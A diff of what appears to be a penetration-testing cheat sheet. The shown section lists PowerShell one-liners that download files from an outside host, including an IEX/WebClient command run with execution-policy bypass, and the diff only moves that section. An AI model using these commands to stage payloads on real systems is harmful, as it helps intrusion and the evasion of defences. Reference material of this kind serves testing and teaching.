@@ -27,10 +27,6 @@ USING POWERSHELL -
 **Web Content Download**
 	
     powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
-   
-**Powershell IEX**
-
-    echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
 
 **Powershell Wget**
 	
@@ -40,6 +36,10 @@ USING POWERSHELL -
 	
     powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"
 
+**Powershell IEX**
+
+    echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
+   
 **Powershell Direct URI**
 	
     iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt
